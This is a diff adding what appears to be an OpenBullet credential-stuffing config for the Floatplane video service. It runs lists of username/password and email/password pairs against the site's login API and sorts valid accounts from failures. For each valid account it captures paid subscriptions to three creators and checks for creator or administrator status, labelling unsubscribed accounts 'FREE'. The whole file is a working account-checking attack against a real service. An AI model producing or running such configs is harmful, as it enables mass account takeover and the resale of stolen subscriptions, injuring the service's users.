@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "Floatplane",
+  "SuggestedBots": 100,
+  "LastModified": "2018-07-16T19:20:10.5536048+00:00",
+  "AdditionalInfo": "v1.01",
+  "Author": "@a",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 1048664287
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 876511921
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://www.floatplane.com/api/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "text/plain" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Error" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Error" 
+#PARSE_ID PARSE "<SOURCE>" JSON "id" Recursive=FALSE -> VAR "ID" "" "" 
+#REQUEST_hasLinusTechTipsSubscrition REQUEST GET "https://www.floatplane.com/api/plan/info?creatorSubId=59f94c0bdd241b70349eb72f" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0" 
+  HEADER "Pragma: no-cache" 
+#PARSE_hasLinusTechTipsSubscription PARSE "<SOURCE>" JSON "userIsSubscribed" Recursive=FALSE -> CAP "hasLinusTechTipsSubscription" "" "" 
+#PARSE_hasLinusTechTipsSubscription PARSE "<SOURCE>" JSON "userIsSubscribed" Recursive=FALSE -> VAR "hasLinusTechTipsSubscription" "" "" 
+#REQUEST_hasBitWitUltraSubscription REQUEST GET "https://www.floatplane.com/api/plan/info?creatorSubId=5a2b1d448789f90c3bf0e427" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0" 
+  HEADER "Pragma: no-cache" 
+#PARSE_hasBitWitUltraSubscription PARSE "<SOURCE>" JSON "userIsSubscribed" Recursive=FALSE -> CAP "hasBitWitUltraSubscription" "" "" 
+#PARSE_hasBitWitUltraSubscription PARSE "<SOURCE>" JSON "userIsSubscribed" Recursive=FALSE -> VAR "hasBitWitUltraSubscription" "" "" 
+#REQUEST_hasTechDealsSubscription REQUEST GET "https://www.floatplane.com/api/plan/info?creatorSubId=5ae3bad468c3250e947d0646" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0" 
+  HEADER "Pragma: no-cache" 
+#PARSE_hasTechDealsSubscription PARSE "<SOURCE>" JSON "userIsSubscribed" Recursive=FALSE -> CAP "hasTechDealsSubscription" "" "" 
+#PARSE_hasTechDealsSubscription PARSE "<SOURCE>" JSON "userIsSubscribed" Recursive=FALSE -> VAR "hasTechDealsSubscription" "" "" 
+#REQUEST_isCreator REQUEST GET "https://www.floatplane.com/api/user/creator?id=<ID>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0" 
+  HEADER "Pragma: no-cache" 
+#PARSE_isCreator PARSE "<SOURCE>" JSON "" Recursive=FALSE -> CAP "isCreator" "" "" 
+#REQUEST_isAdministrator REQUEST GET "https://www.floatplane.com/api/user/administrator?id=<ID>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0" 
+  HEADER "Pragma: no-cache" 
+#PARSE_isAdministrator PARSE "<SOURCE>" JSON "" Recursive=FALSE -> CAP "isAdministrator" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" AND 
+    KEY "<hasTechDealsSubscription>" EqualTo "False" 
+    KEY "<hasBitWitUltraSubscription>" EqualTo "False" 
+    KEY "<hasLinusTechTipsSubscription>" EqualTo "False" 
